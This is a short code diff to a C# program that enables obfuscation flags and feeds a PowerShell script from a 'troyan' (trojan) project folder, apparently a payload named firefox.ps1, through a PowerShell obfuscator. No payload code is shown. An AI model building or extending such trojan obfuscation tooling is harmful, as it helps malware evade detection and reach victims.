@@ -4,9 +4,11 @@ public class Program
 {
     public static bool ObfuscateDebug = false;
     
-    public static bool ObfuscateRelease = false;
+    public static bool ObfuscateRelease = true;
     
-    public static bool RandomCode = false;
+    public static bool RandomCode = true;
+    
+    public static bool RandomDo = true;
     
     static void Clean()
     {
@@ -23,9 +25,9 @@ public class Program
     static void Main2()
     {
         Clean();
-        var data = System.IO.File.ReadAllText(@"C:\soft\hephaestus\troyan\_output\holder.debug.ps1");
+        var data = System.IO.File.ReadAllText(@"D:\soft\hephaestus\troyan\troyanps\firefox.ps1");
         data = new PowerShellObfuscator().Obfuscate(data);
-        System.IO.File.WriteAllText(@"C:\soft\hephaestus\troyan\_output\holder.ob.ps1", data);
+        System.IO.File.WriteAllText(@"D:\soft\hephaestus\troyan\_output\1.ps1", data);
     }
 
     static void Main(string[] args)
